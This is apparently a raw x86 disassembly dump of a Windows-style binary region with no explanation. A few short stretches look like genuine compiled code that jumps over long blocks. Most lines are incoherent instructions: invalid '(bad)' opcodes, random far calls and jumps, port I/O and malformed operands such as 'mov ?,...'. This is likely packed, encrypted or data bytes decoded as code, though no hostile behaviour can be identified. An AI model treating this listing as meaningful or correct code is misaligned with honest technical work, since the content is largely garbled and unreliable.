  4030ee:	call   0xc672:0x43e65e98
  4030f5:	hlt    
  4030f6:	enter  0xf83d,0xca
  4030fa:	mov    BYTE PTR [ebx+0x58],0xc1
  4030fe:	push   esi
  4030ff:	sbb    eax,0xf52ad31c
  403104:	or     DWORD PTR [esi-0x52],ebx
  403107:	jg     0x403094
  403109:	sub    esp,DWORD PTR [edi]
  40310b:	mov    al,ds:0x5106024c
  403110:	sbb    DWORD PTR [eax-0xc],esi
  403113:	(bad)  
  403114:	xor    DWORD PTR [esp+edi*1+0x3b850041],esi
  40311b:	adc    al,0x3
  40311d:	icebp  
  40311e:	cmp    ebp,DWORD PTR [edi+0x4]
  403121:	out    0xbd,al
  403123:	push   ebx
  403124:	mov    cl,0x2
  403126:	lock adc eax,0xa64ca64e
  40312c:	jnp    0x403124
  40312e:	shr    ch,0x1e
  403131:	std    
  403132:	in     eax,dx
  403133:	pusha  
  403134:	xchg   esp,eax
  403135:	push   ss
  403136:	shl    DWORD PTR [esi-0x9],cl
  403139:	jg     0x4030dc
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x52
  40316d:	mov    WORD PTR [ebx+0x7e1589b8],es
  403173:	jle    0x4031e4
  403175:	jge    0x4031f5
  403177:	jle    0x403183
  403179:	jmp    0x54a7:0xebc9bf4
  403180:	out    0x22,eax
  403182:	stc    
  403183:	inc    eax
  403184:	inc    esp
  403185:	or     DWORD PTR [ebx-0x5f],esp
  403188:	mov    DWORD PTR [eax-0x34],0xf90a13a4
  40318f:	pop    ds
  403190:	xor    DWORD PTR [edx-0x6e],0x6e
  403194:	cmc    
  403195:	adc    al,0x76
  403197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403198:	mov    eax,0x23015839
  40319d:	jecxz  0x403191
  40319f:	sahf   
  4031a0:	xchg   ebp,eax
  4031a1:	add    eax,DWORD PTR [ecx-0x42d488a9]
  4031a7:	ret    
  4031a8:	aaa    
  4031a9:	outs   dx,DWORD PTR ds:[esi]
  4031aa:	fprem  
  4031ac:	scas   eax,DWORD PTR es:[edi]
  4031ad:	cwde   
  4031ae:	dec    esp
  4031af:	push   esp
  4031b0:	jae    0x4031fe
  4031b2:	cmp    eax,0xd345aa73
  4031b7:	pushf  
  4031b8:	aad    0xc5
  4031ba:	rol    BYTE PTR [eax-0x71abc75b],0x24
  4031c1:	sbb    BYTE PTR [ebx+0x38],ch
  4031c4:	jb     0x4031ec
  4031c6:	xchg   edi,eax
  4031c7:	jle    0x403204
  4031c9:	nop
  4031ca:	sub    edi,eax
  4031cc:	push   0x68
  4031ce:	sbb    al,0x4e
  4031d0:	jmp    DWORD PTR [esi-0x18e5371]
  4031d6:	stc    
  4031d7:	fdivr  QWORD PTR ds:0xa3bc3eb3
  4031dd:	mov    al,ds:0x4664a9d6
  4031e2:	jne    0x403171
  4031e4:	imul   eax,DWORD PTR [ebx-0x79],0xffffff9f
  4031e8:	and    eax,0x316440ca
  4031ed:	ds push ebx
  4031ef:	mov    edx,0x128845a0
  4031f4:	jmp    0x403182
  4031f6:	fisub  WORD PTR [eax+0x11]
  4031f9:	and    edi,0xffffffd2
  4031fc:	jle    0x403253
  4031fe:	inc    esi
  4031ff:	sbb    esp,DWORD PTR [edi+eax*8-0x5b]
  403203:	lea    esi,[edi+0x49a04e91]
  403209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40320a:	ficom  WORD PTR [ebp+0x47]
  40320d:	sub    DWORD PTR ds:0xcb57656,esp
  403213:	jns    0x403251
  403215:	pop    edx
  403216:	mov    es,WORD PTR [eax-0x75]
  403219:	or     BYTE PTR [eax+edx*1+0x25],bl
  40321d:	cmp    al,0x27
  40321f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403220:	jo     0x403278
  403222:	pop    es
  403223:	adc    BYTE PTR [ebp+eax*2-0x2bffe799],dh
  40322a:	push   ds
  40322b:	sub    DWORD PTR [ebx-0x24219b5],esp
  403231:	mov    eax,ds:0x26288872
  403236:	jmp    0x9c471f26
  40323b:	xchg   edi,eax
  40323c:	xlat   BYTE PTR ds:[ebx]
  40323d:	inc    esi
  40323e:	xchg   edi,eax
  40323f:	fwait
  403240:	popf   
  403241:	rcl    DWORD PTR gs:[ecx+0x2],0x10
  403246:	rcl    edx,0xc6
  403249:	lods   eax,DWORD PTR ds:[esi]
  40324a:	rcl    DWORD PTR [ebp-0x6f92e2e],cl
  403250:	dec    bp
  403252:	push   ss
  403253:	xor    esi,esi
  403255:	fnstsw WORD PTR [esi+0x57]
  403258:	nop
  403259:	xchg   ebx,eax
  40325a:	pop    edx
  40325b:	mov    cl,0xe7
  40325d:	ins    BYTE PTR es:[edi],dx
  40325e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325f:	push   esi
  403260:	push   edi
  403261:	add    BYTE PTR [esi+0x7b],cl
  403264:	dec    esi
  403265:	pop    esi
  403266:	mov    ecx,0x8256edf9
  40326b:	ffreep st(7)
  40326d:	adc    BYTE PTR [eax+0x58b4804e],dh
  403273:	popa   
  403274:	dec    ebx
  403275:	dec    ebx
  403276:	mov    eax,ds:0xbd0cc93f
  40327b:	sbb    eax,0xf6dff1d3
  403280:	jge    0x4032a1
  403282:	sub    edi,esp
  403284:	inc    ebp
  403285:	in     al,0x7
  403287:	call   0x3e86b8ee
  40328c:	xor    eax,0x2a1594c1
  403291:	loope  0x4032a5
  403293:	test   eax,0xdc4d4c1a
  403298:	xlat   BYTE PTR ds:[ebx]
  403299:	jge    0x403224
  40329b:	sbb    dl,BYTE PTR [ebx-0x2fa739d1]
  4032a1:	js     0x4032b6
  4032a3:	les    esi,FWORD PTR [ebx+0x398201b9]
  4032a9:	retf   0x9221
  4032ac:	mov    bl,BYTE PTR [edx+0x7a]
  4032af:	jns    0x403262
  4032b1:	pop    ss
  4032b2:	(bad)  
  4032b3:	ret    0x12b7
  4032b6:	adc    eax,0x3cce7597
  4032bb:	adc    al,0xb0
  4032bd:	imul   ecx,DWORD PTR [ebx+0x2b],0xff2cfb42
  4032c4:	cwde   
  4032c5:	cmp    DWORD PTR [ebx-0x2e],0xd3a449ba
  4032cc:	mov    ecx,0xd1357a79
  4032d1:	(bad)  
  4032d2:	fadd   QWORD PTR [ebp+0x5ebe07f0]
  4032d8:	mov    eax,ds:0xd293890d
  4032dd:	lods   eax,DWORD PTR ds:[esi]
  4032de:	test   eax,0x341d7317
  4032e3:	cmp    DWORD PTR [edx-0x52f83596],0xffffff8a
  4032ea:	lock ins BYTE PTR es:[edi],dx
  4032ec:	mov    bl,0x8c
  4032ee:	rol    cl,1
  4032f0:	mov    eax,ds:0x4d5de1a8
  4032f5:	nop
  4032f6:	ins    DWORD PTR es:[edi],dx
  4032f7:	(bad)  
  4032f8:	int    0x22
  4032fa:	push   es
  4032fb:	mov    dh,0xa1
  4032fd:	inc    ecx
  4032fe:	lock cld 
  403300:	xor    DWORD PTR [ecx-0x5],eax
  403303:	sbb    cl,dh
  403305:	jmp    0xe82d06d7
  40330a:	mov    ch,0xd4
  40330c:	jbe    0x403371
  40330e:	in     al,0xf2
  403310:	mov    esp,0xcaa6fd7b
  403315:	test   DWORD PTR [ebp+esi*2+0x264c6606],0xf279ef26
  403320:	and    al,0xbe
  403322:	and    al,0x98
  403324:	push   eax
  403325:	xchg   edx,eax
  403326:	cmp    al,0xc5
  403328:	mov    fs,ecx
  40332a:	test   DWORD PTR [ecx-0x41b98e7],edi
  403330:	xlat   BYTE PTR ds:[ebx]
  403331:	data16 jae 0x4032f7
  403334:	sbb    al,BYTE PTR gs:[ebp-0x3357495f]
  40333b:	pop    ss
  40333c:	cmc    
  40333d:	mov    al,0x14
  40333f:	inc    ecx
  403340:	push   esi
  403341:	imul   esp,DWORD PTR [esi],0xc00cc7e4
  403347:	repnz push ds
  403349:	rcl    DWORD PTR [ebx],1
  40334b:	add    DWORD PTR [edi-0x7f],edi
  40334e:	shl    DWORD PTR [eax],0x78
  403351:	aas    
  403352:	icebp  
  403353:	cli    
  403354:	test   al,0x86
  403356:	mov    ch,0xc
  403358:	jns    0x403352
  40335a:	push   esp
  40335b:	push   eax
  40335c:	lea    eax,[edx+0x1606395c]
  403362:	mov    ?,WORD PTR [edi-0x4ce4d222]
  403368:	mov    cl,0x33
  40336a:	mov    ebp,esi
  40336c:	or     BYTE PTR [edi+ebx*4],dh
  40336f:	or     BYTE PTR [edx],dh
  403371:	mov    ds:0x3ba08ea1,al
  403376:	mov    dl,0x64
  403378:	mov    al,0x6a
  40337a:	sti    
  40337b:	add    BYTE PTR [edi+0x5a],al
  40337e:	(bad)  
  40337f:	xchg   ebp,eax
  403380:	xchg   ebp,eax
  403381:	scas   eax,DWORD PTR es:[edi]
  403382:	(bad)  
  403384:	mov    al,0xb9
  403386:	cwde   
  403387:	ja     0x4033a5
  403389:	mov    WORD PTR [esi+edi*4],ds
  40338c:	int3   
  40338d:	pop    ecx
  40338e:	xor    cl,BYTE PTR [ecx]
  403390:	push   0xffffffa7
  403392:	inc    ebx
  403393:	mov    edi,0xa5a8ba30
  403398:	retf   0x88c7
  40339b:	sub    BYTE PTR [esi-0x4fbd6e3f],cl
  4033a1:	lea    eax,[ecx]
  4033a3:	mov    bh,0x96
  4033a5:	push   es
  4033a6:	adc    esp,edx
  4033a8:	lds    esi,FWORD PTR [ebp-0x9f4dca6]
  4033ae:	mov    ecx,0x96f538d7
  4033b3:	push   esp
  4033b4:	add    BYTE PTR [esi],al
  4033b6:	ins    BYTE PTR es:[edi],dx
  4033b7:	(bad)
  4033ba:	add    DWORD PTR [ebx+ebx*8-0x1a09dc28],0x71e73db3
  4033c5:	sbb    ah,ch
  4033c7:	add    cl,BYTE PTR ds:0x82243335
  4033cd:	and    DWORD PTR [ebp+0x3c],edx
  4033d0:	lods   al,BYTE PTR ds:[esi]
  4033d1:	xlat   BYTE PTR ds:[ebx]
  4033d2:	arpl   WORD PTR [esi],bx
  4033d4:	imul   ebp,DWORD PTR [esi+edx*1+0x27],0x52ea1f41
  4033dc:	adc    BYTE PTR [ecx],bl
  4033de:	inc    esp
  4033df:	pop    ebx
  4033e0:	pop    es
  4033e1:	xchg   esi,eax
  4033e2:	loopne 0x403391
  4033e4:	add    cl,bl
  4033e6:	scas   al,BYTE PTR es:[edi]
  4033e7:	jmp    0x7672:0xa8492de7
  4033ee:	es adc al,0xe0
  4033f1:	(bad)  
  4033f2:	(bad)  
  4033f3:	not    DWORD PTR [esi-0x1a]
  4033f6:	daa    
  4033f7:	das    
  4033f8:	test   BYTE PTR [ecx+ebp*1],bh
  4033fb:	add    ah,BYTE PTR [edi+0x6df592eb]
  403401:	arpl   WORD PTR [eax-0x7b2b229c],bx
  403407:	xchg   ecx,eax
  403408:	jge    0x4033f4
  40340a:	repz ss jge 0x403453
  40340e:	in     eax,dx
  40340f:	cwde   
  403410:	pop    esi
  403411:	adc    eax,0x6006c96a
  403416:	pop    ss
  403417:	mov    edx,DWORD PTR [ebp-0x55]
  40341a:	outs   dx,BYTE PTR ds:[esi]
  40341b:	and    esi,edx
  40341d:	xchg   DWORD PTR [ecx+0xb],edi
  403420:	add    al,0x24
  403422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403423:	(bad)  
  403424:	repz sub BYTE PTR [edi+0x29],cl
  403428:	cmp    edx,DWORD PTR [edi+0x669af1df]
  40342e:	pop    eax
  40342f:	sbb    ah,bl
  403431:	js     0x4033de
  403433:	mov    bl,0x28
  403435:	fdivp  st(2),st
  403437:	jno    0x40344b
  403439:	cwde   
  40343a:	cmp    ecx,DWORD PTR [ebp-0x20002b18]
  403440:	dec    esi
  403441:	jne    0x4033d0
  403443:	dec    edi
  403444:	xchg   edi,eax
  403445:	mov    bl,0x24
  403447:	pop    ecx
  403448:	cmc    
  403449:	adc    esi,DWORD PTR [edx]
  40344b:	mov    cl,0xb2
  40344d:	xchg   ecx,eax
  40344e:	addps  xmm5,XMMWORD PTR [ecx+0x207a958d]
  403455:	lods   eax,DWORD PTR es:[esi]
  403457:	mov    dl,0x9b
  403459:	in     al,0xe9
  40345b:	out    dx,al
  40345c:	hlt    
  40345d:	xchg   edx,eax
  40345e:	lods   eax,DWORD PTR ds:[esi]
  40345f:	fs cli 
  403461:	pop    edi
  403462:	push   eax
  403463:	cdq    
  403464:	sub    DWORD PTR [edi],ecx
  403466:	lock inc ebp
  403468:	add    dl,BYTE PTR ds:0xb7089d5b
  40346e:	out    dx,eax
  40346f:	cs inc ebp
  403471:	int    0x1e
  403473:	ds in  eax,dx
  403475:	inc    edx
  403476:	mov    dl,0x8a
  403478:	sbb    al,0x40
  40347a:	pop    ecx
  40347b:	mov    ds:0x7a65d8d3,al
  403480:	mov    cl,0xe7
  403482:	dec    ebx
  403483:	call   0x729:0xc556aaa0
  40348a:	int    0x5
  40348c:	jne    0x4034df
  40348e:	out    dx,al
  40348f:	cmp    BYTE PTR [edx+edi*1+0xe7d90e3],0x2c
  403497:	push   edx
  403498:	xor    eax,0xc6958c2b
  40349d:	fyl2x  
  40349f:	lahf   
  4034a0:	mov    al,ds:0xd547ed2b
  4034a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a6:	or     al,0x12
  4034a8:	jp     0x403493
  4034aa:	stos   DWORD PTR es:[edi],eax
  4034ab:	xor    DWORD PTR [ebp+edi*4+0x37702189],ebx
  4034b2:	aam    0xb8
  4034b4:	mov    ds:0xb473e1fb,al
  4034b9:	push   ecx
  4034ba:	mov    DWORD PTR [ecx+0x7a],ecx
  4034bd:	push   ebp
  4034be:	sbb    al,0x7a
  4034c0:	mov    ebx,0xe859f857
  4034c5:	fs iret 
  4034c7:	das    
  4034c8:	or     ecx,DWORD PTR [ebx]
  4034ca:	retf   0x2373
  4034cd:	xchg   edx,eax
  4034ce:	sub    BYTE PTR [ecx],ah
  4034d0:	mov    ebx,0x34dd0c49
  4034d5:	aas    
  4034d6:	inc    esp
  4034d7:	hlt    
  4034d8:	lods   eax,DWORD PTR ds:[esi]
  4034d9:	jo     0x4034d5
  4034db:	das    
  4034dc:	jp     0x4034e7
  4034de:	pop    esp
  4034df:	dec    esi
  4034e0:	and    BYTE PTR [edx-0x25],cl
  4034e3:	jbe    0x4034be
  4034e5:	inc    esp
  4034e6:	add    BYTE PTR ds:0x464cf5ce,bh
  4034ec:	hlt    
  4034ed:	mov    al,BYTE PTR [esp+eax*1+0x25984eb6]
  4034f4:	fbstp  TBYTE PTR [ecx+0x7c]
  4034f7:	test   BYTE PTR [esp+ebp*2+0x23],0xb2
  4034fc:	shr    ecx,cl
  4034fe:	adc    esi,DWORD PTR [edx+esi*2]
  403501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403502:	adc    al,0x6d
  403504:	sti    
  403505:	into   
  403506:	mov    eax,ecx
  403508:	(bad)  
  403509:	mov    ds:0xaa870f45,eax
  40350e:	cmp    ch,BYTE PTR [esi+ebx*4]
  403511:	xchg   DWORD PTR [edx+0x75bb62ea],ebx
  403517:	push   edi
  403518:	int    0x42
  40351a:	int3   
  40351b:	hlt    
  40351c:	paddsb mm5,mm3
  40351f:	sub    edx,DWORD PTR [eax]
  403521:	in     al,dx
  403522:	sbb    bl,BYTE PTR [bx+di+0x1e]
  403526:	int    0x24
  403528:	pop    esp
  403529:	stos   BYTE PTR es:[edi],al
  40352a:	call   FWORD PTR [esi]
  40352c:	fidivr WORD PTR [esi-0x2f]
  40352f:	call   ecx
  403531:	fist   WORD PTR [edi]
  403533:	es out dx,eax
  403535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403536:	jbe    0x403535
  403538:	pop    edi
  403539:	pushf  
  40353a:	adc    eax,0x73d26f51
  40353f:	or     cl,cl
  403541:	ret    0x9e5f
  403544:	mov    ah,0xec
  403546:	mov    edi,0x6b234cc5
  40354b:	push   0x7a3eb35d
  403550:	sar    BYTE PTR [esi+0xe73b3dd],1
  403556:	cwde   
  403557:	cs out dx,eax
  403559:	sub    edi,edx
  40355b:	ins    BYTE PTR es:[edi],dx
  40355c:	mov    ah,0x48
  40355e:	mov    esp,0x110866a4
  403563:	mov    WORD PTR [ecx+0x493bf664],?
  403569:	mov    ecx,DWORD PTR [ebp-0x8]
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	jno    0x403557
  403599:	mov    dh,0xef
  40359b:	xchg   BYTE PTR [ecx],dl
  40359d:	jle    0x40361d
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x403547
  4035a4:	pushf  
  4035a5:	mov    cl,BYTE PTR ds:[ebx]
  4035a8:	jno    0x4035fd
  4035aa:	or     esp,ebp
  4035ac:	sbb    dh,bh
  4035ae:	(bad)  
  4035af:	out    dx,eax
  4035b0:	ret    0x277f
  4035b3:	fild   QWORD PTR [ebx-0x2eff78fa]
  4035b9:	(bad)  
  4035ba:	(bad)  
  4035bc:	jle    0x403608
  4035be:	inc    ecx
  4035bf:	ja     0x403542
  4035c1:	(bad)  
  4035c3:	push   eax
  4035c4:	and    eax,0x1ee40710
  4035c9:	and    DWORD PTR [ebp+0x31dacddf],0xffffffd2
  4035d0:	pop    esi
  4035d1:	jmp    0x403574
  4035d3:	popa   
  4035d4:	shl    BYTE PTR [ebp+0x1c],1
  4035d7:	adc    ebx,edx
  4035d9:	sub    BYTE PTR [ebx+0x6b],dh
  4035dc:	jp     0x403606
  4035de:	jns    0x4035d0
  4035e0:	mov    edx,fs
  4035e2:	(bad)  [ebx+0x30]
  4035e5:	or     eax,0xb957b1aa
  4035ea:	(bad)  
  4035eb:	(bad)  
  4035ec:	inc    esp
  4035ed:	jecxz  0x4035b8
  4035ef:	(bad)
  4035f2:	inc    edx
  4035f3:	inc    esp
  4035f4:	mov    ebp,0xcea10c9e
  4035f9:	fs cli 
  4035fb:	add    al,0x76
  4035fd:	sub    DWORD PTR [edi+edi*1],eax
  403600:	cmp    BYTE PTR [esi+0x1b7e31fa],bl
  403606:	xor    DWORD PTR [eax-0x77ccdf55],0xffffff96
  40360d:	inc    esi
  40360e:	add    BYTE PTR [eax],0x4d
  403611:	ret    
  403612:	mov    DWORD PTR ds:0x368b741,esp
  403618:	jmp    0x4035e1
  40361a:	imul   esp,DWORD PTR ds:0x63c4cf46,0xbada6257
  403624:	mov    BYTE PTR [eax],dl
  403626:	xchg   ebx,eax
  403627:	push   ecx
  403628:	loopne 0x403600
  40362a:	test   al,0xd6
  40362c:	adc    ebp,DWORD PTR [edx]
  40362e:	aad    0x10
  403630:	scas   eax,DWORD PTR es:[edi]
  403631:	out    dx,al
  403632:	es inc ecx
  403634:	pop    edi
  403635:	add    BYTE PTR [ecx+0x14],dl
  403638:	(bad)  
  403639:	xchg   edi,eax
  40363a:	stos   BYTE PTR es:[edi],al
  40363b:	or     al,0xea
  40363d:	call   0xc1cd:0x66b54767
  403644:	push   esp
  403645:	mov    ds:0x67e2c4eb,al
  40364a:	adc    DWORD PTR [ecx],0x79
  40364d:	ror    BYTE PTR [edi],0xfc
  403650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403651:	fs popa 
  403653:	(bad)  
  403654:	xlat   BYTE PTR ds:[ebx]
  403655:	stc    
  403656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403657:	mov    ds:0x89483116,eax
  40365c:	in     eax,dx
  40365d:	add    al,0x21
  40365f:	add    al,0xc8
  403661:	fimul  DWORD PTR [esi-0x2f]
  403664:	not    BYTE PTR [edi-0x7]
  403667:	jecxz  0x403614
  403669:	cmp    cl,BYTE PTR [ecx+0x8301216]
  40366f:	ss jbe 0x4035f2
  403672:	jmp    0x4036c0
  403674:	in     al,dx
  403675:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403677:	sbb    ecx,edi
  403679:	sub    eax,0x7c604e7d
  40367e:	dec    ebp
  40367f:	aam    0xb0
  403681:	mov    al,ds:0x356a6c5e
  403686:	(bad)  
  403687:	dec    BYTE PTR [ecx-0x7fb2f946]
  40368d:	jge    0x403616
  40368f:	outs   dx,BYTE PTR ds:[esi]
  403690:	lods   eax,DWORD PTR ds:[esi]
  403691:	add    BYTE PTR [edi],dl
  403693:	mov    al,0x2a
  403695:	sub    dh,BYTE PTR [ecx]
  403697:	test   eax,0x5d0d39df
  40369c:	push   edi
  40369d:	test   al,0xd0
  40369f:	pop    edi
  4036a0:	push   ecx
  4036a1:	loope  0x403718
  4036a3:	fdivr  DWORD PTR [ebx]
  4036a5:	and    ch,ch
  4036a7:	out    0x73,eax
  4036a9:	outs   dx,BYTE PTR ds:[esi]
  4036aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ab:	and    ebx,ebx
  4036ad:	jbe    0x403684
  4036af:	mov    al,cl
  4036b1:	(bad)  
  4036b2:	fdivr  DWORD PTR [ecx+edx*1+0x57]
  4036b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b7:	daa    
  4036b8:	lds    ebp,FWORD PTR [edi-0x63b29077]
  4036be:	dec    esi
  4036bf:	xchg   BYTE PTR [ecx],ch
  4036c1:	aad    0x1d
  4036c3:	cmpxchg DWORD PTR [ebx-0x33f81acd],edx
  4036ca:	sbb    edx,edi
  4036cc:	mov    cl,0x54
  4036ce:	mul    eax
  4036d0:	fcom   QWORD PTR [ecx-0x17371286]
  4036d6:	lock adc BYTE PTR [esi+0x6dfb2e31],ch
  4036dd:	cmp    eax,DWORD PTR [edx+esi*1+0x5525ff32]
  4036e4:	mov    ss,WORD PTR [edi+0x24]
  4036e7:	cmp    DWORD PTR [ebx],esp
  4036e9:	enter  0xc03f,0xf2
  4036ed:	inc    ecx
  4036ee:	jbe    0x40374d
  4036f0:	jl     0x403710
  4036f2:	fistp  WORD PTR [eax]
  4036f4:	(bad)  
  4036f5:	mov    al,0x5
  4036f7:	std    
  4036f8:	popf   
  4036f9:	and    BYTE PTR [esi+0x7a],ah
  4036fc:	mov    al,ds:0x53ca793e
  403701:	xor    al,0xed
  403703:	push   0xa9e8b9ef
  403708:	loopne 0x4036c8
  40370a:	jno    0x4036e4
  40370c:	mov    eax,ds:0x251cb049
  403711:	push   cs
  403712:	dec    edx
  403713:	sbb    ah,BYTE PTR [ebx-0x58]
  403716:	mov    cl,dh
  403718:	or     BYTE PTR [ebp-0x10f9b4e1],ah
  40371e:	das    
  40371f:	sub    eax,0xa5bc076f
  403724:	sar    esp,cl
  403726:	push   edx
  403727:	pop    ebx
  403728:	dec    esi
  403729:	sbb    bl,0xc5
  40372c:	add    bl,BYTE PTR [esi+0x72]
  40372f:	mov    esp,es
  403731:	mov    ecx,0xfc0ac4aa
  403736:	daa    
  403737:	iret   
  403738:	push   0xffffffa2
  40373a:	int3   
  40373b:	mov    dl,0x37
  40373d:	xor    esi,eax
  40373f:	cmp    DWORD PTR [esi],edi
  403741:	add    edx,edi
  403743:	xor    DWORD PTR [edi],eax
  403745:	adc    BYTE PTR [edx],dl
  403747:	(bad)  
  403748:	push   edi
  403749:	bound  esp,QWORD PTR [ecx+0x64]
  40374c:	inc    eax
  40374d:	or     eax,0xdc79ab62
  403752:	out    0x1b,al
  403754:	xchg   DWORD PTR [edx+eiz*4+0x3715d360],esi
  40375b:	push   ebp
  40375c:	test   DWORD PTR ds:0x66d4c334,ebp
  403762:	mov    cl,0x6
  403764:	xchg   edx,eax
  403765:	jecxz  0x40379c
  403767:	push   esi
  403768:	xor    bl,BYTE PTR [esi]
  40376a:	leave  
  40376b:	push   eax
  40376c:	mov    ecx,?
  40376e:	ret    
  40376f:	adc    bl,ch
  403771:	jg     0x403799
  403773:	(bad)  
  403774:	and    edx,DWORD PTR [edx+0x47]
  403777:	sti    
  403778:	loope  0x4037b7
  40377a:	and    ah,BYTE PTR [ebx+0x1e]
  40377d:	jle    0x4037c8
  40377f:	dec    edx
  403780:	pop    edi
  403781:	mov    WORD PTR [edi+0x7a],si
  403785:	lods   eax,DWORD PTR ds:[esi]
  403786:	mov    esp,0x83f8b499
  40378b:	repz inc ebx
  40378d:	push   ecx
  40378e:	push   0x2c
  403790:	add    dh,BYTE PTR [esi+0xa]
  403793:	pusha  
  403794:	stos   DWORD PTR es:[edi],eax
  403795:	xchg   edx,eax
  403796:	addr16 int 0x23
  403799:	loopne 0x403813
  40379b:	das    
  40379c:	int    0xd4
  40379e:	and    eax,0x592b68a8
  4037a3:	inc    ecx
  4037a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037a5:	and    ah,BYTE PTR ds:0x9c5ef7dc
  4037ab:	push   ecx
  4037ac:	sub    eax,0x321583f8
  4037b1:	scas   al,BYTE PTR es:[edi]
  4037b2:	xor    eax,0x1a6eda4e
  4037b7:	lods   eax,DWORD PTR ds:[esi]
  4037b8:	mov    ds:0xd425a66e,al
  4037bd:	test   al,0xb7
  4037bf:	mov    dl,0xf4
  4037c1:	cmp    al,0xa6
  4037c3:	dec    ebx
  4037c4:	or     BYTE PTR ds:0x5d839be8,dl
  4037ca:	mov    dl,0xfd
  4037cc:	push   edx
  4037cd:	jg     0x40378b
  4037cf:	and    dl,BYTE PTR [ebx]
  4037d1:	ror    BYTE PTR [edi],cl
  4037d3:	popa   
  4037d4:	and    ch,bl
  4037d6:	cli    
  4037d7:	inc    esp
  4037d8:	nop
  4037d9:	sub    eax,0x622e80cd
  4037df:	lods   eax,DWORD PTR ds:[esi]
  4037e0:	push   ebp
  4037e1:	sahf   
  4037e2:	add    BYTE PTR [eax+0x64],dl
  4037e5:	aas    
  4037e6:	(bad)  
  4037e8:	pop    eax
  4037e9:	(bad)  
  4037ea:	mov    ebp,0x82ddee1d
  4037ef:	jnp    0x40384b
  4037f1:	(bad)  
  4037f2:	fidivr DWORD PTR [ebp+0x10]
  4037f5:	test   al,0x42
  4037f7:	in     al,dx
  4037f8:	cmp    eax,0xd1e5717b
  4037fd:	and    DWORD PTR [ebp-0x205fff2f],ebp
  403803:	push   edi
  403804:	daa    
  403805:	mov    bl,0x8a
  403807:	fnstenv [eax+0x118a7ee1]
  40380d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40380e:	cli    
  40380f:	inc    ebx
  403810:	fimul  DWORD PTR [ecx-0x14]
  403813:	lock (bad) [ecx+esi*4-0x128d6b6a]
  40381b:	test   DWORD PTR [eax-0x70],edx
  40381e:	ins    DWORD PTR es:[edi],dx
  40381f:	cli    
  403820:	sbb    ebx,DWORD PTR [ecx-0x6]
  403823:	aam    0x70
  403825:	outs   dx,BYTE PTR ds:[esi]
  403826:	inc    ecx
  403827:	icebp  
  403828:	xchg   edi,eax
  403829:	xchg   dl,dl
  40382b:	inc    esi
  40382c:	mov    ah,0xe0
  40382e:	shl    BYTE PTR [edx],cl
  403830:	ja     0x40389b
  403832:	or     BYTE PTR [ecx+0x5d],cl
  403835:	bound  ecx,QWORD PTR [ecx-0x1c]
  403838:	test   al,0xf3
  40383a:	jbe    0x403831
  40383c:	or     eax,0x1cd1c17b
  403841:	and    al,0x12
  403843:	into   
  403844:	sahf   
  403845:	stos   DWORD PTR es:[edi],eax
  403846:	retf   0x620a
  403849:	imul   esi,DWORD PTR [esi+ecx*2],0xfffffff1
  40384d:	ins    DWORD PTR es:[edi],dx
  40384e:	mov    esi,0xa9926366
  403853:	xlat   BYTE PTR ds:[ebx]
  403854:	popa   
  403855:	pop    ecx
  403856:	scas   eax,DWORD PTR es:[edi]
  403857:	dec    eax
  403858:	out    0x54,eax
  40385a:	jnp    0x40383c
  40385c:	add    al,0x95
  40385e:	das    
  40385f:	mov    ch,0xf6
  403861:	xchg   bh,bl
  403863:	mov    bh,0x2
  403865:	leave  
  403866:	sub    DWORD PTR [edi+eiz*1+0x5f351936],0xacae324d
  403871:	das    
  403872:	mov    cl,0x94
  403874:	hlt    
  403875:	(bad)  
  403876:	das    
  403877:	retf   
  403878:	sub    eax,0x6a1c8033
  40387d:	pop    esi
  40387f:	inc    edx
  403880:	retf   
  403881:	daa    
  403882:	aaa    
  403883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403884:	inc    ebp
  403885:	(bad)  
  403887:	shl    BYTE PTR [esi-0x67],cl
  40388a:	loopne 0x403824
  40388c:	or     BYTE PTR [ebx+0x2],al
  40388f:	mov    al,al
  403891:	cwde   
  403892:	sbb    al,al
  403894:	xchg   DWORD PTR [esi],esi
  403896:	cmp    al,0x55
  403898:	dec    edx
